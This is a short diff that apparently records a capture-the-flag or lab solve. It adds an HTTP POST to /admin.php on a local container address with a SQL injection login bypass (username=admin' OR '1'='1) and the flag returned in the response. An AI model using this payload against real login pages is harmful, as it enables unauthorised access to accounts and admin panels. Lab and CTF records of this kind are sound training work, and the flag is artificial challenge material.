@@ -1,0 +1,4 @@
+# POST /admin.php HTTP/1.1\nHost: 172.17.0.1:43105\nContent-Type: application/x-www-form-urlencoded\n\nusername=admin' OR '1'='1&password=test\n\nResponse: flag{c969819d-7a14-4c90-b85d-51eccd232580}
+
+GET /admin.php HTTP/1.1
+Host: 172.17.0.1:43105
